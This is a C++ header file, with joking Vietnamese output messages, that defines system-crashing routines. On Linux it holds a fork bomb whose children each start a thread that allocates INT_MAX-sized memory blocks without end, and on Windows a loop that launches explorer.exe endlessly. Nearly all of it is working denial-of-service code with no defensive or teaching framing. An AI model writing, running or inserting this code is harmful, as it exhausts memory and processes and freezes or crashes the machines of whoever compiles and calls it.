#ifndef I_HPP
#define I_HPP
#include <iostream>
#include <vector>
#include <stdlib.h>
#include <limits.h>
#ifdef _WIN32
#include <windows.h>
#elif defined(__linux__)
#include <unistd.h>
#endif
#include <thread>
namespace cppheader {
	#ifdef __linux__
	int anothernuke() {
		std::vector<void*> phan_cap_phat;
		while (true) {
			void* ptr = malloc(INT_MAX);
			if (!ptr) {
				std::cout << "Cuu! May tinh sap no!" << std::endl;
				break;
			}
			phan_cap_phat.push_back(ptr);
			std::cout << "Da cap phat them co... khong biet :D" << std::endl;
		}
		return 0;
	}
	int tsarbombalinux() {
		while (true) {
			if (fork() == 0) {
				std::thread(anothernuke).detach();
			}
		}
		return 0;
	}
	#elif defined(_WIN32)
	int tsarbombawindows() {
		STARTUPINFO si = {sizeof(si)};
		PROCESS_INFORMATION pi;
		while (true) {
			if (CreateProcess(
				NULL,
				(LPSTR)"explorer.exe",
				NULL, NULL, FALSE, 0,
				NULL, NULL, &si, &pi))
			{
				std::cout << "Yayyyy!" << std::endl;
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
			}
			else {
				std::cerr << "Error detected! SOS!!!! " << GetLastError() << std::endl;
			}
		}
		return 0;
	}
	#endif
}
#endif
